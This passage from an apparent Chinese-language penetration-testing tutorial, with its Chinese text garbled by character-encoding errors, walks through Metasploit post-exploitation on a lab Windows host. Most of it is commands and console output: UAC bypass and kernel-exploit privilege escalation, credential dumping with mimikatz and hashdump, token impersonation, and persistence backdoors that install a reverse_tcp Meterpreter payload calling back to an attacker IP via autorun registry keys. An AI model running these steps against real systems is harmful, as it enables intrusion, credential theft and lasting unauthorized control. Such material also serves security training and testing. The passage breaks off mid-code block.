getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ</span><br><span class="line"># ç„¶é¹…è¿™é‡Œå¤±è´¥äº†</span><br></pre></td></tr></table></figure>3.å†…æ ¸æ¼æ´ææƒæ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´</span><br></pre></td></tr></table></figure><h3 id="4-6-è·å–å‡­è¯-3"><a href="#4-6-è·å–å‡­è¯-3" class="headerlink" title="4.6 è·å–å‡­è¯"></a>4.6 è·å–å‡­è¯</h3>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚1.ä½¿ç”¨mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">wdigest  #è·å–Wdigestå¯†ç </span><br><span class="line">mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdumpä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-å‡å†’ä»¤ç‰Œ-3"><a href="#4-7-å‡å†’ä»¤ç‰Œ-3" class="headerlink" title="4.7 å‡å†’ä»¤ç‰Œ"></a>4.7 å‡å†’ä»¤ç‰Œ</h3>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognitoå‡å†’ä»¤ç‰Œ</span><br><span class="line">use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #å‡å†’SYSTEM token</span><br><span class="line">æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\</span><br><span class="line">execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ</span><br><span class="line">æˆ–è€…ç›´æ¥shell</span><br><span class="line">rev2self   #è¿”å›åŸå§‹token</span><br><span class="line"></span><br><span class="line"># 2.steal_tokençªƒå–ä»¤ç‰Œ</span><br><span class="line">steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps</span><br><span class="line">drop_token  #åˆ é™¤çªƒå–çš„token</span><br></pre></td></tr></table></figure><h3 id="4-8-æ¤å…¥åé—¨-3"><a href="#4-8-æ¤å…¥åé—¨-3" class="headerlink" title="4.8 æ¤å…¥åé—¨"></a>4.8 æ¤å…¥åé—¨</h3>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚1.persistenceå¯åŠ¨é¡¹åé—¨è·¯å¾„ï¼šmetasploit/scripts/meterpreter/persistenceåŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip</span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit/windows/local/persistence2.metsvcæœåŠ¡åé—¨åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run metsvc â€“A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚3.persistence_exeå†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 